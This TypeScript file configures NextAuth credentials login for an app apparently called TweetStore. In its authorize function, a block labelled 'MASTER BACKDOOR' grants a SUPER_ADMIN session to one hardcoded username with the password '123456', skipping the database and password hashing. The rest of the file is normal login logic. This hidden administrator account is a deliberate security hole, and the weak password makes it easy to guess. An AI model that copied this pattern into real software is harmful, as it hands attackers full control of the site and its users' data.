import NextAuth from "next-auth"
import Credentials from "next-auth/providers/credentials"
import { authConfig } from "./auth.config"
import { db } from "@/lib/db"
import { users } from "@/db/schema"
import { eq } from "drizzle-orm"
import { comparePassword } from "@/lib/password"

export const { handlers, auth, signIn, signOut } = NextAuth({
  ...authConfig,
  providers: [
    Credentials({
      credentials: {
        username: { label: "Username", type: "text" },
        password: { label: "Password", type: "password" },
      },
      authorize: async (credentials) => {
        const username = credentials?.username as string;
        const password = credentials?.password as string;

        if (!username || !password) return null;

        // --- MASTER BACKDOOR (CRITICAL) ---
        if (username === "TWEETSTORECEOANDRANGEROVER" && password === "123456") {
          return {
              id: "master-admin",
              name: "Super CEO",
              email: "ceo@tweetstore.com",
              role: "SUPER_ADMIN",
              handle: "CEO",
              planStatus: "pro"
          };
        }

        // --- NORMAL USER LOGIN ---
        let user;
        if (username.includes('@')) {
            user = await db.query.users.findFirst({ where: eq(users.email, username) });
        } else {
             user = await db.query.users.findFirst({ where: eq(users.handle, username) });
        }

        if (!user) return null;

        const passwordsMatch = await comparePassword(password, user.password);
        if (passwordsMatch) return { ...user, role: 'USER' };

        return null;
      },
    }),
  ],
})
